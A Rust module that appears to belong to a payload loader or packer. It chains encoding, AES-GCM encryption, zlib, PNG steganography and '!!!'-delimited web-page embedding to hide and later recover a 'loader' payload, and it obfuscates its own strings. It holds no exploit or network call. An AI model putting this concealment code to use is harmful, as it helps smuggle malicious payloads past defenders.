use crate::lsb_text_png_steganography_mod::{hide_mod, reveal_mod};

use anyhow::anyhow;
use anyhow::{Context, Result};

use base64::prelude::*;
use regex::Regex;
use rot13::rot13;
use serde::{Deserialize, Serialize};

use ring::aead::Aad;
use ring::aead::BoundKey;
use ring::aead::Nonce;
use ring::aead::NonceSequence;
use ring::aead::OpeningKey;
use ring::aead::SealingKey;
use ring::aead::Tag;
use ring::aead::UnboundKey;
use ring::aead::AES_256_GCM;
use ring::aead::NONCE_LEN;
use ring::error::Unspecified;

use rand::Rng;
use ring::rand::SecureRandom;
use ring::rand::SystemRandom;

use flate2::Compression;
use flate2::write::ZlibEncoder;
use flate2::write::ZlibDecoder;
use std::io::Write;

use cryptify::encrypt_string;
use log::debug;

struct CounterNonceSequence(u32);
use std::env;

impl NonceSequence for CounterNonceSequence {
    // called once for each seal operation
    fn advance(&mut self) -> Result<Nonce, Unspecified> {
        let mut nonce_bytes = vec![0; NONCE_LEN];

        let bytes = self.0.to_be_bytes();
        nonce_bytes[8..].copy_from_slice(&bytes);

        self.0 += 1; // advance the counter
        Nonce::try_assume_unique_for_key(&nonce_bytes)
    }
}

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub enum DataOperation {
    BASE64,
    AEAD(AeadMaterial),
    WEBPAGE,
    ROT13, //only after base64 because input is String
    REVERSE,
    STEGANO,
    ZLIB,
}

pub trait UnApplyDataOperation {
    fn un_apply_one_operation(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error>;
    fn base64_decode(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: BASE64 decode"));
        BASE64_STANDARD
            .decode(data)
            .with_context(|| encrypt_string!("Failed to decode BASE64"))
    }
    fn rot13_decode(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: ROT13 decode"));
        Ok(rot13(&String::from_utf8(data)?).into_bytes())
    }

    fn webpage_harvesting(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: WEBPAGE harvesting"));
        let haystack = String::from_utf8_lossy(&*data);
        let re = Regex::new(r"!!!(?<loader>\S+)!!!").unwrap();

        let Some(caps) = re.captures(&haystack) else {
            let e: Result<Vec<u8>, anyhow::Error> = Err(anyhow::Error::msg(encrypt_string!(
                "Failed to harvest WEBPAGE"
            )));
            return e;
        };
        Ok(caps["loader"].as_bytes().to_vec())
    }

    fn stegano_decode_lsb(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: STEGANO decode"));
        Ok(reveal_mod(data)?)
    }

    fn zlib_decompress(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: ZLIB decode"));
        let writer = Vec::new();
        let mut d: ZlibDecoder<Vec<u8>> = ZlibDecoder::new(writer);
        let _ = d.write_all(&data);
        let writer: Vec<u8> = d.finish()?;
        Ok(writer)
    }


}
impl UnApplyDataOperation for DataOperation {
    fn un_apply_one_operation(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        match self {
            DataOperation::BASE64 => self.base64_decode(data),
            DataOperation::ROT13 => self.rot13_decode(data),
            DataOperation::WEBPAGE => self.webpage_harvesting(data),
            DataOperation::AEAD(aead_material) => aead_material.decrypt_mat(data),
            DataOperation::STEGANO => self.stegano_decode_lsb(data),
            DataOperation::ZLIB => self.zlib_decompress(data),
            DataOperation::REVERSE => todo!(),
        }
    }
}

pub trait ApplyDataOperation {
    fn apply_one_operation(&mut self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error>;
    fn base64_encode(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: BASE64 encode"));
        Ok(BASE64_STANDARD.encode(data).into_bytes())
    }
    fn rot13_encode(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: ROT13 encode"));
        Ok(rot13(&String::from_utf8(data)?).into_bytes())
    }

    fn webpage_create(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: WEBPAGE create"));
        Ok(format!("!!!{}!!!", std::str::from_utf8(&data)?).into_bytes())
    }

    fn stegano_encode_lsb(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: STEGANO encode"));

        let input_image: String = env::var("STEGANO_INPUT_IMAGE").unwrap();
        let output_image: String = env::var("STEGANO_OUTPUT_IMAGE").unwrap();
        debug!(
            "{}{}",
            encrypt_string!("STEGANO_INPUT_IMAGE: "),
            input_image
        );
        debug!(
            "{}{}",
            encrypt_string!("STEGANO_OUTPUT_IMAGE: "),
            output_image
        );
       let img: image::ImageBuffer<image::Rgb<u8>, Vec<u8>> = hide_mod(data, &input_image);

        //TODO, try to remove this part
        //let output_image: String = format! {"{}.stegano.png",input_image};
        debug!("{}{}", encrypt_string!("IMAGE SAVE to "), &output_image);
        img.save(output_image).unwrap();

        //this part is useless as vec is not the good way to save IMAGE
        // TODO: try to img.export to vec, and then save it later differently
        Ok(img.to_vec())
    }

    fn zlib_encode(&self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: ZLIB encode"));
        //let mut e: ZlibEncoder<Vec<u8>> = ZlibEncoder::new(Vec::new(), Compression::default());
        let mut e: ZlibEncoder<Vec<u8>> = ZlibEncoder::new(Vec::new(), Compression::best());
        let _ = e.write_all(&data);
        let compressed_bytes = e.finish()?;
        Ok(compressed_bytes)
    }
}


impl ApplyDataOperation for DataOperation {
    fn apply_one_operation(&mut self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        match self {
            DataOperation::BASE64 => self.base64_encode(data),
            DataOperation::ROT13 => self.rot13_encode(data),
            DataOperation::WEBPAGE => self.webpage_create(data),
            DataOperation::AEAD(aead_material) => aead_material.encrypt_mat(data),
            DataOperation::STEGANO => self.stegano_encode_lsb(data),
            DataOperation::ZLIB => self.zlib_encode(data),
            DataOperation::REVERSE => todo!(),
        }
    }
}

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct AeadMaterial {
    pub key_bytes: Vec<u8>,
    pub associated_data: Vec<u8>,
    pub nonce: u32,
    pub tag: Vec<u8>,
}
impl AeadMaterial {
    fn decrypt_mat(&self, in_out: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}", encrypt_string!("dataoperation: AEAD decrypt"));
        //let mut ccc: Vec<u8> = cypher_text_with_tag.clone();
        let mut cypher_text_with_tag = [&in_out, self.tag.as_slice()].concat();
        // Recreate the previously moved variables
        let unbound_key = match UnboundKey::new(&AES_256_GCM, &self.key_bytes) {
            Ok(key) => key,
            Err(Unspecified) => return Err(anyhow!(encrypt_string!("Load UnboundKey"))),
        };
        let nonce_sequence = CounterNonceSequence(self.nonce);
        let associated_data = Aad::from(self.associated_data.as_slice());

        // Create a new AEAD key for decrypting and verifying the authentication tag
        let mut opening_key = OpeningKey::new(unbound_key, nonce_sequence);

        // Decrypt the data by passing in the associated data and the cypher text with the authentication tag appended
        let decrypted_data: &mut [u8] =
            match opening_key.open_in_place(associated_data, &mut cypher_text_with_tag) {
                Ok(data) => data,
                Err(Unspecified) => return Err(anyhow!(encrypt_string!("Decrypt data fail"))),
            };
        Ok(decrypted_data.to_vec())
    }

    fn encrypt_mat(&mut self, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        // Data to be encrypted
        debug!("{}", encrypt_string!("dataoperation: AEAD encrypt"));

        // Create a new AEAD key without a designated role or nonce sequence
        let unbound_key = UnboundKey::new(&AES_256_GCM, &self.key_bytes).unwrap();
        let nonce_sequence = CounterNonceSequence(self.nonce);
        // Create a new AEAD key for encrypting and signing ("sealing"), bound to a nonce sequence
        // The SealingKey can be used multiple times, each time a new nonce will be used
        let mut sealing_key = SealingKey::new(unbound_key, nonce_sequence);

        // This data will be authenticated but not encrypted
        //let associated_data = Aad::empty(); // is optional so can be empty
        let associated_data = Aad::from(self.associated_data.as_slice());

        // Create a mutable copy of the data that will be encrypted in place
        let mut in_out = data.clone();

        // Encrypt the data with AEAD using the AES_256_GCM algorithm
        let tag: Tag = sealing_key
            .seal_in_place_separate_tag(associated_data, &mut in_out)
            .unwrap();
        self.tag = tag.as_ref().to_vec();
        //let cypher_text_with_tag = [&in_out, tag.as_ref()].concat();
        Ok(in_out)
        //Ok((in_out,tag))
    }
    #[allow(dead_code)]
    pub fn init_aead_key_material() -> AeadMaterial {
        let rand: SystemRandom = SystemRandom::new();
        let mut key_bytes: Vec<u8> = vec![0; AES_256_GCM.key_len()];
        rand.fill(&mut key_bytes).unwrap();
        //let associated_data_hex = b"LE SCEAU DU CARDINAL".to_vec();
        let associated_data_hex = Aad::empty().as_ref().to_vec();
        let mut rng = rand::thread_rng();
        let nonce: u32 = rng.gen::<u32>();

        AeadMaterial {
            key_bytes: key_bytes,
            associated_data: associated_data_hex,
            nonce: nonce,
            tag: vec![],
        }
    }
}

pub fn apply_all_dataoperations(
    data_operations: &mut Vec<DataOperation>,
    mut data: Vec<u8>,
) -> Result<Vec<u8>, anyhow::Error> {
    data_operations.reverse();
    for operation in data_operations {
        data = operation.apply_one_operation(data)?;
    }
    Ok(data)
}

pub fn un_apply_all_dataoperations(
    dataoperation: Vec<DataOperation>,
    mut data: Vec<u8>,
) -> Result<Vec<u8>, anyhow::Error> {
    for operation in dataoperation {
        //info!("un_apply_one :{:?}",operation);
        data = operation.un_apply_one_operation(data)?;
    }
    Ok(data)
}
